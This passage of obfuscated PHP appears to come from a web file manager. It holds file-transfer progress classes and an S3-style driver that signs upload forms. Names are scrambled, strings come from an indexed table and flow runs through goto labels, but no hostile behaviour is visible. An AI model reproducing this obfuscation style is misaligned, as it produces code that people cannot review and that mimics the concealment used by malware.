} goto FËØœÍåıÓ; EòéôÊ“ıÜ: $E≤¶‹”Ö≈˜ =& $_SERVER[ú∫]; $c¥˘¡øä»Ê = array($E≤¶‹”Ö≈˜[29] => $E≤¶‹”Ö≈˜[1549]); if ($F°ï˜Í∂£•) { $c¥˘¡øä»Ê[$E≤¶‹”Ö≈˜[1528]] = $F°ï˜Í∂£•; } goto A“ÜÊã«ô’; aÓúõ˘¡∆Ì: } public static function valueSet($b©â‹æùìç, $cÖªô«˜Êå) { goto BÖÕÙ†‘√≠; BÖÕÙ†‘√≠: $b»ÏñæÁ⁄æ =& $_SERVER[ú∫]; if (!$cÖªô«˜Êå) { return Model($b»ÏñæÁ⁄æ[425])->where(array($b»ÏñæÁ⁄æ[93] => $b©â‹æùìç, $b»ÏñæÁ⁄æ[29] => $b»ÏñæÁ⁄æ[1549]))->delete(); } $fê”ÎÑÉÑ¢ = json_encode($cÖªô«˜Êå); goto CÜÍ„ïÈ·; CÜÍ„ïÈ·: if (!$fê”ÎÑÉÑ¢) { ob_start(); var_dump($cÖªô«˜Êå); $f∫ ù≠◊á· = ob_get_clean(); self::log($b»ÏñæÁ⁄æ[1550] . json_encode_force($f∫ ù≠◊á·)); } if (!$b©â‹æùìç || !$cÖªô«˜Êå[$b»ÏñæÁ⁄æ[393]]) { return !1; } $EŸöùíÀ∫ô = array($b»ÏñæÁ⁄æ[29] => $b»ÏñæÁ⁄æ[1549], $b»ÏñæÁ⁄æ[1528] => USER_ID, $b»ÏñæÁ⁄æ[93] => $b©â‹æùìç, $b»ÏñæÁ⁄æ[372] => $fê”ÎÑÉÑ¢); goto CÎ∫›ô÷¡œ; CÎ∫›ô÷¡œ: Model($b»ÏñæÁ⁄æ[425])->add($EŸöùíÀ∫ô, array(), !0); goto D¶éÒ©¶«Ò; D¶éÒ©¶«Ò: } public static function log($c“áÂ¨‡Ñ∞) { if (!GLOBAL_DEBUG) { return; } write_log($c“áÂ¨‡Ñ∞, $_SERVER[ú∫][1551]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto fó™©¡Çƒ’; Fúµ´û∞ºÀ: Hook::bind($E∂∏çœÂˆû[566], array($this, $E∂∏çœÂˆû[1557])); Hook::bind($E∂∏çœÂˆû[567], array($this, $E∂∏çœÂˆû[1558])); Hook::bind($E∂∏çœÂˆû[569], array($this, $E∂∏çœÂˆû[1559])); goto f˘¶†∂ÿáÒ; A∞”ú¡≤∫≠: Hook::bind($E∂∏çœÂˆû[1561], array($this, $E∂∏çœÂˆû[1562])); Hook::bind($E∂∏çœÂˆû[559], array($this, $E∂∏çœÂˆû[1563])); $this->sourceModelCopyFlag = !1; goto cé•±äﬁ≥ì; bú°—ÑÆéΩ: Hook::bind($E∂∏çœÂˆû[539], array($this, $E∂∏çœÂˆû[1560])); Hook::bind($E∂∏çœÂˆû[541], array($this, $E∂∏çœÂˆû[1560])); Hook::bind($E∂∏çœÂˆû[543], array($this, $E∂∏çœÂˆû[1560])); goto A∞”ú¡≤∫≠; CÖﬂΩÂƒ´ﬂ: Hook::bind($E∂∏çœÂˆû[1552], array($this, $E∂∏çœÂˆû[1553])); Hook::bind($E∂∏çœÂˆû[1110], array($this, $E∂∏çœÂˆû[1554])); Hook::bind($E∂∏çœÂˆû[1555], array($this, $E∂∏çœÂˆû[1556])); goto Fúµ´û∞ºÀ; fó™©¡Çƒ’: $E∂∏çœÂˆû =& $_SERVER[ú∫]; $cıä”‰£ë° =& $this->task; $this->sourceCopyFolder = !1; goto CÖﬂΩÂƒ´ﬂ; A ÷‚õúü…: $cıä”‰£ë°[$E∂∏çœÂˆû[1576]] = 0; $cıä”‰£ë°[$E∂∏çœÂˆû[1577]] = 0; if (!$cıä”‰£ë°[$E∂∏çœÂˆû[1432]]) { $cıä”‰£ë°[$E∂∏çœÂˆû[1432]] = LNG($E∂∏çœÂˆû[1578]); } goto B∑ï“∑ï‚∆; A‡ªà‘œë: $cıä”‰£ë°[$E∂∏çœÂˆû[1570]] = LNG($E∂∏çœÂˆû[1571]); $cıä”‰£ë°[$E∂∏çœÂˆû[1572]] = 0; $cıä”‰£ë°[$E∂∏çœÂˆû[1573]] = 0; goto C“•≠ìÖ£ë; cé•±äﬁ≥ì: Hook::bind($E∂∏çœÂˆû[1564], array($this, $E∂∏çœÂˆû[1565])); Hook::bind($E∂∏çœÂˆû[1566], array($this, $E∂∏çœÂˆû[1567])); Hook::bind($E∂∏çœÂˆû[1568], array($this, $E∂∏çœÂˆû[1569])); goto A‡ªà‘œë; f˘¶†∂ÿáÒ: Hook::bind($E∂∏çœÂˆû[570], array($this, $E∂∏çœÂˆû[1559])); Hook::bind($E∂∏çœÂˆû[537], array($this, $E∂∏çœÂˆû[1560])); Hook::bind($E∂∏çœÂˆû[534], array($this, $E∂∏çœÂˆû[1560])); goto bú°—ÑÆéΩ; C“•≠ìÖ£ë: $cıä”‰£ë°[$E∂∏çœÂˆû[1023]] = $E∂∏çœÂˆû[33]; $cıä”‰£ë°[$E∂∏çœÂˆû[1574]] = $E∂∏çœÂˆû[33]; $cıä”‰£ë°[$E∂∏çœÂˆû[1575]] = 0; goto A ÷‚õúü…; B∑ï“∑ï‚∆: } protected function endAfter() { goto f€ÒÏ‘¿Ç‘; EÃ‹Õìâãè: Hook::unbind($EûÈﬂ£„êú[534], array($this, $EûÈﬂ£„êú[1560])); Hook::unbind($EûÈﬂ£„êú[539], array($this, $EûÈﬂ£„êú[1560])); Hook::unbind($EûÈﬂ£„êú[541], array($this, $EûÈﬂ£„êú[1560])); goto EÀï®ŸË„º; Bàå∑ƒÀÿ†: Hook::unbind($EûÈﬂ£„êú[569], array($this, $EûÈﬂ£„êú[1559])); Hook::unbind($EûÈﬂ£„êú[570], array($this, $EûÈﬂ£„êú[1559])); Hook::unbind($EûÈﬂ£„êú[537], array($this, $EûÈﬂ£„êú[1560])); goto EÃ‹Õìâãè; EÀï®ŸË„º: Hook::unbind($EûÈﬂ£„êú[543], array($this, $EûÈﬂ£„êú[1560])); Hook::unbind($EûÈﬂ£„êú[1561], array($this, $EûÈﬂ£„êú[1562])); Hook::unbind($EûÈﬂ£„êú[559], array($this, $EûÈﬂ£„êú[1563])); goto FŸŸ≠⁄’Èì; f€ÒÏ‘¿Ç‘: $EûÈﬂ£„êú =& $_SERVER[ú∫]; Hook::unbind($EûÈﬂ£„êú[1552], array($this, $EûÈﬂ£„êú[1553])); Hook::unbind($EûÈﬂ£„êú[1110], array($this, $EûÈﬂ£„êú[1554])); goto Aê∫À“˜√ç; Aê∫À“˜√ç: Hook::unbind($EûÈﬂ£„êú[1555], array($this, $EûÈﬂ£„êú[1556])); Hook::unbind($EûÈﬂ£„êú[566], array($this, $EûÈﬂ£„êú[1557])); Hook::unbind($EûÈﬂ£„êú[567], array($this, $EûÈﬂ£„êú[1558])); goto Bàå∑ƒÀÿ†; FŸŸ≠⁄’Èì: Hook::unbind($EûÈﬂ£„êú[1564], array($this, $EûÈﬂ£„êú[1565])); Hook::unbind($EûÈﬂ£„êú[1566], array($this, $EûÈﬂ£„êú[1567])); Hook::unbind($EûÈﬂ£„êú[1568], array($this, $EûÈﬂ£„êú[1569])); goto bÑ–·”ºí»; bÑ–·”ºí»: } public function copyMoveStart($eê›ñ≈ﬂÙá, $f®ñ‹ÚàÜ⁄, $A¡¡Ø–âáì, $cï√”≥º›Û) { goto A›ìÆ¨ö´; A›ìÆ¨ö´: $bÍÍ„Úú†⁄ =& $_SERVER[ú∫]; self::log($bÍÍ„Úú†⁄[1579] . $f®ñ‹ÚàÜ⁄ . $bÍÍ„Úú†⁄[67] . $cï√”≥º›Û); $f¬∆¢ª®—Ñ = rtrim(TEMP_FILES, $bÍÍ„Úú†⁄[8]); goto B¬âÂí⁄úÇ; Aô÷•Áº≤Â: $dœ–…ÂØ ‡[$bÍÍ„Úú†⁄[1580]] = KodIO::transferType($eê›ñ≈ﬂÙá, $A¡¡Ø–âáì); $this->update(); goto a–ê∫€â£û; B¬âÂí⁄úÇ: if (substr($f®ñ‹ÚàÜ⁄, 0, strlen($f¬∆¢ª®—Ñ)) == $f¬∆¢ª®—Ñ) { return; } if (substr($cï√”≥º›Û, 0, strlen($f¬∆¢ª®—Ñ)) == $f¬∆¢ª®—Ñ) { return; } $dœ–…ÂØ ‡ =& $this->task; goto Aô÷•Áº≤Â; a–ê∫€â£û: } public function updateAfter() { goto b†Ë…·ÑÎÉ; EÁÉÈá∑ﬁ∂: $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1529]] = $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1577]] / $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[723]]; if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1529]] > 0) { $aùòåÕàˆ√ = timeFloat() - $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[749]] - $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1532]]; $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1533]] = $aùòåÕàˆ√ * (1 - $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1529]]) / $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1529]]; } goto EÚ§Œß≥‘ñ; b†Ë…·ÑÎÉ: $C∂˘ÙËØ≤¶ =& $_SERVER[ú∫]; $d£õ∞ ‰≈€ =& $this->task; if (!$d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[723]]) { return; } goto A≤Ï∂¬»¡¶; A≤Ï∂¬»¡¶: if ($this->sourceModelCopyFlag) { return; } if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1580]] == $C∂˘ÙËØ≤¶[1183]) { return; } if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1580]] == $C∂˘ÙËØ≤¶[1094] || $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1580]] == $C∂˘ÙËØ≤¶[107]) { if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1574]]) { $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1577]] = $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1576]] + $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1573]]; } } else { if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1580]] == $C∂˘ÙËØ≤¶[1184]) { if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1574]] == $C∂˘ÙËØ≤¶[1094]) { $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1577]] = $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1576]] + $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1573]] * 0.5; } else { if ($d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1574]] == $C∂˘ÙËØ≤¶[107]) { $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1577]] = $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1576]] + $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1572]] * 0.5 + $d£õ∞ ‰≈€[$C∂˘ÙËØ≤¶[1573]] * 0.5; } } } } goto EÁÉÈá∑ﬁ∂; EÚ§Œß≥‘ñ: } public function addPath($d∑ΩÒêãò£) { goto E›Ãïø¬ÓÉ; E›Ãïø¬ÓÉ: $DÍÒïÎ·¿Ñ =& $_SERVER[ú∫]; if (!$d∑ΩÒêãò£) { return; } $Eç´Á•ıâ˘ =& $this->task; goto C¡Ñ§˘ä’∫; C¡Ñ§˘ä’∫: $c£‰Ìœáﬁç = IO::infoWithChildren($d∑ΩÒêãò£); $BæáˆÔ÷∆ï = $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[1581]] ? $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[1581]][$DÍÒïÎ·¿Ñ[1582]] : 0; $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[1581]] = array($DÍÒïÎ·¿Ñ[1582] => $BæáˆÔ÷∆ï + 1, $DÍÒïÎ·¿Ñ[413] => $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[28]], $DÍÒïÎ·¿Ñ[76] => $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[76]], $DÍÒïÎ·¿Ñ[495] => $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[495]] ? $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[495]] : $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[76]]); goto aêëæÍ∏Á‡; aêëæÍ∏Á‡: if ($c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[29]] == $DÍÒïÎ·¿Ñ[193]) { $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[1021]] += 1; } else { $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[1021]] += $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[81]][$DÍÒïÎ·¿Ñ[79]]; if ($c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[395]]) { $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[1021]] += $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[81]][$DÍÒïÎ·¿Ñ[80]] + 1; } } $Eç´Á•ıâ˘[$DÍÒïÎ·¿Ñ[723]] += $c£‰Ìœáﬁç[$DÍÒïÎ·¿Ñ[78]]; $this->update(); goto a”ÑâäÕüå; a”ÑâäÕüå: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($bà¶í‡œ›Á) { $BÆœé“ö´€ =& $_SERVER[ú∫]; $DÖ°ˆ◊ËÂÜ =& $this->task; $DÖ°ˆ◊ËÂÜ[$BÆœé“ö´€[1570]] = $bà¶í‡œ›Á[$BÆœé“ö´€[28]]; $DÖ°ˆ◊ËÂÜ[$BÆœé“ö´€[1023]] = $bà¶í‡œ›Á[$BÆœé“ö´€[28]]; $this->update(); } public function copyFileStart($d˘âë”¢Ç, $a•ü›—›ç¨, $fåÀ·ëå◊ê, $Dñ—Ô•ÒÚê, $b•öˆ¥ÿëí, $Fá…⁄“ΩâÓ) { goto D–¡∂ÏñÔÜ; d˜≠ë‘ÿê„: $this->update(); goto bíÊ°ÕÈÛü; fÀ¯ûîöéë: $GLOBALS[$aÏ≥°‰¶òÙ[1584]] = $b•öˆ¥ÿëí; $GLOBALS[$aÏ≥°‰¶òÙ[1583]] = $Fá…⁄“ΩâÓ; $AÆ¨ïŸπâ =& $this->task; goto fﬂµΩ‘òÑ¥; fﬂµΩ‘òÑ¥: $AÆ¨ïŸπâ[$aÏ≥°‰¶òÙ[1570]] = $B„ëßÜœç©; $AÆ¨ïŸπâ[$aÏ≥°‰¶òÙ[1572]] = (int) $d˘âë”¢Ç->size($a•ü›—›ç¨); $AÆ¨ïŸπâ[$aÏ≥°‰¶òÙ[1573]] = 0; goto BÃ‘ÉﬁåßÎ; BÃ‘ÉﬁåßÎ: $AÆ¨ïŸπâ[$aÏ≥°‰¶òÙ[1023]] = $aÏ≥°‰¶òÙ[33]; $AÆ¨ïŸπâ[$aÏ≥°‰¶òÙ[1574]] = $aÏ≥°‰¶òÙ[33]; $AÆ¨ïŸπâ[$aÏ≥°‰¶òÙ[1575]] = 0; goto d˜≠ë‘ÿê„; D–¡∂ÏñÔÜ: $aÏ≥°‰¶òÙ =& $_SERVER[ú∫]; $B„ëßÜœç© = $b•öˆ¥ÿëí; if ($B„ëßÜœç© == $GLOBALS[$aÏ≥°‰¶òÙ[1583]]) { $B„ëßÜœç© = $GLOBALS[$aÏ≥°‰¶òÙ[1584]]; } goto fÀ¯ûîöéë; bíÊ°ÕÈÛü: } public function copyFileEnd($CèÈÃÑ•´, $a§§û–¯»ó, $AÜúé´∆å÷, $aÁ¥ ÎÜáá, $BΩ¯∏¥â∏, $EÕÓòÎÒ·è) { $DºÏü˜è˜â =& $_SERVER[ú∫]; $cÍß¡°Í≥ç =& $this->task; $cÍß¡°Í≥ç[$DºÏü˜è˜â[1573]] = $cÍß¡°Í≥ç[$DºÏü˜è˜â[1572]]; $cÍß¡°Í≥ç[$DºÏü˜è˜â[1574]] = $DºÏü˜è˜â[33]; if ($BΩ¯∏¥â∏ == $cÍß¡°Í≥ç[$DºÏü˜è˜â[1570]]) { $cÍß¡°Í≥ç[$DºÏü˜è˜â[1576]] += $cÍß¡°Í≥ç[$DºÏü˜è˜â[1572]]; $cÍß¡°Í≥ç[$DºÏü˜è˜â[1577]] = $cÍß¡°Í≥ç[$DºÏü˜è˜â[1576]]; $this->update(1); } else { $this->update(); $cÍß¡°Í≥ç[$DºÏü˜è˜â[1573]] = 0; } self::log($DºÏü˜è˜â[1585] . $a§§û–¯»ó . $DºÏü˜è˜â[67] . $aÁ¥ ÎÜáá . $DºÏü˜è˜â[229] . $BΩ¯∏¥â∏ . $DºÏü˜è˜â[1586] . $cÍß¡°Í≥ç[$DºÏü˜è˜â[1570]]); } public function updateFileEnd($CÜ÷≤àÊä›, $bâÏ∏∞ê¬È) { goto DÊ‰ºù©÷ï; f∂πÇΩªúà: $cü∂∆ÿÊÀö[$d§ä ı≈Ô∆[1572]] = $bâÏ∏∞ê¬È; $cü∂∆ÿÊÀö[$d§ä ı≈Ô∆[1576]] += $bâÏ∏∞ê¬È; $cü∂∆ÿÊÀö[$d§ä ı≈Ô∆[1577]] = $cü∂∆ÿÊÀö[$d§ä ı≈Ô∆[1576]]; goto EÈò≤ÜÂÛÖ; EÈò≤ÜÂÛÖ: $this->update(1); self::log($d§ä ı≈Ô∆[1587] . $CÜ÷≤àÊä›); goto DíøÜ÷Æ¯ê; DÊ‰ºù©÷ï: $d§ä ı≈Ô∆ =& $_SERVER[ú∫]; $cü∂∆ÿÊÀö =& $this->task; $cü∂∆ÿÊÀö[$d§ä ı≈Ô∆[1570]] = $CÜ÷≤àÊä›; goto f∂πÇΩªúà; DíøÜ÷Æ¯ê: } public function sourceModelCopy($cﬁ∂úöôºÆ) { goto dÌéÔ›ˆå≥; a‹ëõ≈∏õ±: $dÎèÊë’Â´ =& $this->task; $this->sourceModelCopyFlag = !0; $cﬂÛ¨Ç⁄Ωœ = 0; goto EÌ´ııæÓÑ; EÌ´ııæÓÑ: switch ($C≠ıñÂ—ê„) { case $D¡ôÀﬂç»ò[535]: $cﬂÛ¨Ç⁄Ωœ = 1; break; case $D¡ôÀﬂç»ò[538]: $dÎèÊë’Â´[$D¡ôÀﬂç»ò[1570]] = $Fáø†””◊‚[$D¡ôÀﬂç»ò[28]]; break; case $D¡ôÀﬂç»ò[540]: $cﬂÛ¨Ç⁄Ωœ = intval($cﬁ∂úöôºÆ[$D¡ôÀﬂç»ò[377]] * 0.4); break; case $D¡ôÀﬂç»ò[542]: $cﬂÛ¨Ç⁄Ωœ = intval($cﬁ∂úöôºÆ[$D¡ôÀﬂç»ò[377]] * 0.2); break; case $D¡ôÀﬂç»ò[544]: $cﬂÛ¨Ç⁄Ωœ = intval($cﬁ∂úöôºÆ[$D¡ôÀﬂç»ò[377]] * 0.4); break; } $this->update($cﬂÛ¨Ç⁄Ωœ); $this->sourceModelCopyFlag = !1; goto b≠—•∂§°ä; dÌéÔ›ˆå≥: $D¡ôÀﬂç»ò =& $_SERVER[ú∫]; $C≠ıñÂ—ê„ = $cﬁ∂úöôºÆ[0]; $Fáø†””◊‚ = $cﬁ∂úöôºÆ[1]; goto a‹ëõ≈∏õ±; b≠—•∂§°ä: } public function sourceRemove($B≠Ò“Ê¬¥Ç, $F ˜ﬁòπîÜ) { $BÙˆï◊œ°˜ =& $_SERVER[ú∫]; $this->sourceModelCopyFlag = !0; $bÖ†åªò¨æ = 1; if (isset($B≠Ò“Ê¬¥Ç[$BÙˆï◊œ°˜[81]])) { $bÖ†åªò¨æ = $B≠Ò“Ê¬¥Ç[$BÙˆï◊œ°˜[81]][$BÙˆï◊œ°˜[79]] + $B≠Ò“Ê¬¥Ç[$BÙˆï◊œ°˜[81]][$BÙˆï◊œ°˜[80]] + 1; } $this->update($bÖ†åªò¨æ); $this->sourceModelCopyFlag = !1; } public function sourceMove($B≠îÊØπÃÿ) { $this->sourceRemove($B≠îÊØπÃÿ, !1); } public function curlProgress($EƒŸÖ”œò§, $dîü§Öä¥ù, $A∞Æ∫ùÃ»Ó, $CÛ¨Ò¡–øã, $DπøÌåáÑ) { $BÒœË¯∫èø =& $_SERVER[ú∫]; $Aƒ£◊ö â∑ =& $this->task; if ($DπøÌåáÑ > 0) { $Aƒ£◊ö â∑[$BÒœË¯∫èø[1023]] = $BÒœË¯∫èø[1588]; $Aƒ£◊ö â∑[$BÒœË¯∫èø[1574]] = $BÒœË¯∫èø[107]; if ($Aƒ£◊ö â∑[$BÒœË¯∫èø[1572]]) { $Aƒ£◊ö â∑[$BÒœË¯∫èø[1573]] = $DπøÌåáÑ; } if ($Aƒ£◊ö â∑[$BÒœË¯∫èø[1575]]) { $Aƒ£◊ö â∑[$BÒœË¯∫èø[1573]] = $DπøÌåáÑ + $Aƒ£◊ö â∑[$BÒœË¯∫èø[1575]]; } } else { if ($A∞Æ∫ùÃ»Ó > 0) { if ($Aƒ£◊ö â∑[$BÒœË¯∫èø[1572]] == $dîü§Öä¥ù) { $Aƒ£◊ö â∑[$BÒœË¯∫èø[1573]] = $A∞Æ∫ùÃ»Ó; $Aƒ£◊ö â∑[$BÒœË¯∫èø[1023]] = $BÒœË¯∫èø[1589]; $Aƒ£◊ö â∑[$BÒœË¯∫èø[1574]] = $BÒœË¯∫èø[1094]; } } } $this->update(); } public function curlProgressStart($f°¡œÍöÊ∑) { } public function curlProgressEnd($fÇﬂ”∏óíŒ) { goto E‚â”⁄„∂É; E»ûÕÜÜ√ü: $A‘Ü√ˆ‹Ò› = $BÈÿ–¢§®™[$f≠ôÆﬁç≤Ç[1590]]; if ($A‘Ü√ˆ‹Ò› == -1) { $A‘Ü√ˆ‹Ò› = $BÈÿ–¢§®™[$f≠ôÆﬁç≤Ç[1591]]; } if ($bÇ”éá∆ß÷[$f≠ôÆﬁç≤Ç[1574]] == $f≠ôÆﬁç≤Ç[107] && $A‘Ü√ˆ‹Ò›) { $bÇ”éá∆ß÷[$f≠ôÆﬁç≤Ç[1575]] += $A‘Ü√ˆ‹Ò›; } goto aæïù∑î‰°; E‚â”⁄„∂É: $f≠ôÆﬁç≤Ç =& $_SERVER[ú∫]; $bÇ”éá∆ß÷ =& $this->task; $BÈÿ–¢§®™ = curl_getinfo($fÇﬂ”∏óíŒ); goto E»ûÕÜÜ√ü; aæïù∑î‰°: $this->update(); goto aÖ∑ƒõ·ˆ; aÖ∑ƒõ·ˆ: } } class TaskHttp extends Task { protected function startAfter() { $dÁ∂´ üêé =& $_SERVER[ú∫]; $bÛΩ¬π¥é’ =& $this->task; $bÛΩ¬π¥é’[$dÁ∂´ üêé[1592]] = 1; Hook::bind($dÁ∂´ üêé[1564], array($this, $dÁ∂´ üêé[1593])); Hook::bind($dÁ∂´ üêé[1566], array($this, $dÁ∂´ üêé[1594])); Hook::bind($dÁ∂´ üêé[1568], array($this, $dÁ∂´ üêé[1595])); } protected function endAfter() { $B‡˘àﬁÑê¥ =& $_SERVER[ú∫]; Hook::unbind($B‡˘àﬁÑê¥[1564], array($this, $B‡˘àﬁÑê¥[1593])); Hook::unbind($B‡˘àﬁÑê¥[1566], array($this, $B‡˘àﬁÑê¥[1594])); Hook::unbind($B‡˘àﬁÑê¥[1568], array($this, $B‡˘àﬁÑê¥[1595])); } public function progressStart($bã™ªü÷©Ÿ) { $d›ä⁄œ™π« =& $_SERVER[ú∫]; $f÷ïΩÿ·°© = curl_getinfo($bã™ªü÷©Ÿ); self::log($d›ä⁄œ™π«[1596] . $f÷ïΩÿ·°©[$d›ä⁄œ™π«[305]]); self::valueSet($this->task[$d›ä⁄œ™π«[393]], $this->task); } public function progressEnd($bÍÉ∏çπÛˆ) { $FôπÜ€ÓòŸ =& $_SERVER[ú∫]; self::log($FôπÜ€ÓòŸ[1597] . $this->task[$FôπÜ€ÓòŸ[393]]); $this->end(); } public function progress($cŒÇ¿∏œ¨“, $cˆä¿€´ù™, $dÊ∏á‰§Óâ, $cÈ√Ø»ıîá, $D§»Úˆ·å) { $BÛ´æ∫À‰◊ =& $_SERVER[ú∫]; $DÌÕ∞¨ú±ª =& $this->task; if ($D§»Úˆ·å > 0) { $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1021]] = $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1021]] == 0 ? $cÈ√Ø»ıîá : $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1021]]; $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1036]] = $D§»Úˆ·å; } else { if ($dÊ∏á‰§Óâ > 0) { $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1021]] = $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1021]] == 0 ? $cˆä¿€´ù™ : $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1021]]; $DÌÕ∞¨ú±ª[$BÛ´æ∫À‰◊[1036]] = $dÊ∏á‰§Óâ; } } $this->update(); self::log("\160\162\x6f\x67\x72\145\163\163\x48\164\164\x70\72\x64\157\167\x6e\72{$dÊ∏á‰§Óâ}\x2f{$cˆä¿€´ù™}\x3b\40\165\x70\x6c\157\x61\144\72{$D§»Úˆ·å}\57{$cÈ√Ø»ıîá}\x3b"); } } goto b∏ÊäΩñÖ’; CóÖ«ûôêâ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($c≥ùÊÎá§Ü) { parent::__construct($c≥ùÊÎá§Ü); $this->signatureVersion($_SERVER[ú∫][212]); } public function uploadFormData($BΩ–ä¨Íñâ, $C„¥ΩÕÚøã = 3600) { goto e·´çÖÊ⁄˘; e·´çÖÊ⁄˘: $eÚ√ø‰ººé =& $_SERVER[ú∫]; $eøÜ≠Ìπ¡è = $eÚ√ø‰ººé[192]; $dåŒ—Ê‡˜® = $eÚ√ø‰ººé[1224]; goto B¨Œù“Ò®è; Aë∞â”Ûö: $FÚò’ô’ïò = hash_hmac($eÚ√ø‰ººé[1234], $bÇ•◊úääñ, $B…¨Ô•˜Ω¥, !0); $FâÀ›úãﬂÚ = hash_hmac($eÚ√ø‰ººé[1234], $B†∑∆ªÖú—, $FÚò’ô’ïò, !0); $BêÌÖ¨Ç∏ÿ = hash_hmac($eÚ√ø‰ººé[1234], $FìÏîÑÊß, $FâÀ›úãﬂÚ); goto b€†£∞¬öñ; B¨Œù“Ò®è: $bÇ•◊úääñ = $eÚ√ø‰ººé[59]; $D•á…Ù û¶ = gmdate($eÚ√ø‰ººé[1225]); $C¢˘ôã—ﬁ¢ = gmdate($eÚ√ø‰ººé[711]); goto FÙ˜÷Áä»º; dÕâää”äπ: $BÃòû™Œ±ª = array($this->accessKey, $C¢˘ôã—ﬁ¢, $this->region, $bÇ•◊úääñ, $B†∑∆ªÖú—); $a∏‡áŸäœÑ = implode($eÚ√ø‰ººé[8], $BÃòû™Œ±ª); $cµ‹áƒÉæÓ = array($eÚ√ø‰ººé[1191] => gmdate($eÚ√ø‰ººé[1190], strtotime($eÚ√ø‰ººé[1227])), $eÚ√ø‰ººé[1192] => array(array($eÚ√ø‰ººé[1194] => $this->bucket), array($eÚ√ø‰ººé[1193] => $eøÜ≠Ìπ¡è), array($eÚ√ø‰ººé[1195], $eÚ√ø‰ººé[1196], $eÚ√ø‰ººé[33]), array($eÚ√ø‰ººé[1195], $eÚ√ø‰ººé[1228], $eÚ√ø‰ººé[33]), array($eÚ√ø‰ººé[1195], $eÚ√ø‰ººé[1229], $eÚ√ø‰ººé[33]), array($eÚ√ø‰ººé[1197] => $f∫œÒ«“∏‰), array($eÚ√ø‰ººé[1230] => $a∏‡áŸäœÑ), array($eÚ√ø‰ººé[1231] => $dåŒ—Ê‡˜®), array($eÚ√ø‰ººé[1232] => $D•á…Ù û¶), array($eÚ√ø‰ººé[1233] => $FΩúÛÇîéó))); goto aÒ˜œä§Ô∑; b€†£∞¬öñ: $F—‰ƒè€’î = array($eÚ√ø‰ººé[211] => $eÚ√ø‰ººé[33], $eÚ√ø‰ººé[1236] => $eÚ√ø‰ººé[33], $eÚ√ø‰ººé[1193] => $eøÜ≠Ìπ¡è, $eÚ√ø‰ººé[1197] => $f∫œÒ«“∏‰, $eÚ√ø‰ººé[1201] => $FìÏîÑÊß, $eÚ√ø‰ººé[1237] => $a∏‡áŸäœÑ, $eÚ√ø‰ººé[1238] => $dåŒ—Ê‡˜®, $eÚ√ø‰ººé[1239] => $D•á…Ù û¶, $eÚ√ø‰ººé[1240] => $FΩúÛÇîéó, $eÚ√ø‰ººé[1241] => $BêÌÖ¨Ç∏ÿ, $eÚ√ø‰ººé[175] => $this->getHost()); return $F—‰ƒè€’î; goto Fâ…‡∏ªïÍ; aÒ˜œä§Ô∑: $FìÏîÑÊß = base64_encode(json_encode($cµ‹áƒÉæÓ)); $eÜ‡»áäﬁÜ = hash_hmac($eÚ√ø‰ººé[1234], $C¢˘ôã—ﬁ¢, $eÚ√ø‰ººé[1235] . $this->secret, !0); $B…¨Ô•˜Ω¥ = hash_hmac($eÚ√ø‰ººé[1234], $this->region, $eÜ‡»áäﬁÜ, !0); goto Aë∞â”Ûö; FÙ˜÷Áä»º: $B†∑∆ªÖú— = $eÚ√ø‰ººé[1226]; $FΩúÛÇîéó = $C„¥ΩÕÚøã . $eÚ√ø‰ººé[33]; $f∫œÒ«“∏‰ = $eÚ√ø‰ººé[1189]; goto dÕâää”äπ; Fâ…‡∏ªïÍ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; 